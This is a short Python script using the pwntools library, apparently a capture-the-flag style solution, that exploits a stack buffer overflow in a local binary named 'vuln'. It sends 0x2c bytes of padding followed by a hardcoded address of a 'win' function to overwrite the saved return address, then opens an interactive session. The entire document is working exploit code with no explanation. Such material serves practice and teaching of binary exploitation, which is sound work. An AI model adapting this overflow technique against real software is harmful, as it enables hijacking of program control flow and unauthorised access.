from pwn import *

win_addr = 0x080485cb

payload = 'a'*0x28 + 'a'*0x4 + p32(win_addr)

r = process('./vuln')

r.recvuntil('\n')
r.sendline(payload)

r.interactive()
